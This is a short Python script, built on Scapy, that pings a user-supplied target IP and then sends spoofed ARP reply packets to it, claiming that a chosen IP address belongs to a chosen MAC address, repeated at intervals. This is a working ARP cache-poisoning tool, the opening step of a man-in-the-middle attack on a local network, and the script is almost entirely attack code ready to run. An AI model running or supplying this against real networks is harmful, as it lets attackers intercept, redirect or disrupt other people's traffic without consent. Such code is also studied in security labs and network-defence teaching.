import time
from scapy.all import sr1, send, ARP, IP, ICMP


def send_ping(target):
    print(f"Pinging {target}...")
    packet = IP(dst=target)/ICMP()
    response = sr1(packet, timeout=2, verbose=False)

    if response:
        if response[ICMP].type == 0 and response[ICMP].code == 0:
            print(f"Reply from {target}: Host is reachable!")
        else:
            print(
                f"Reply from {target}: ICMP Type {response[ICMP].type}, Code {response[ICMP].code}")
    else:
        print(f"No response from {target} (Host may be down or ICMP blocked)")


def send_arp_poison(target_ip, fake_ip, fake_mac, interval=2, count=10):
    print(f"Sending ARP Poison: {fake_ip} is at {fake_mac}")
    arp_packet = ARP(op=2, pdst=target_ip, psrc=fake_ip, hwsrc=fake_mac)

    for _ in range(count):
        send(arp_packet, verbose=False)
        print(
            f"ARP Poison packet sent to {target_ip} ({fake_ip} → {fake_mac})")
        time.sleep(interval)


if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    send_ping(target_ip)

    fake_ip = input("Enter fake IP: ")
    fake_mac = input("Enter fake MAC: ")
    send_arp_poison(target_ip, fake_ip, fake_mac)
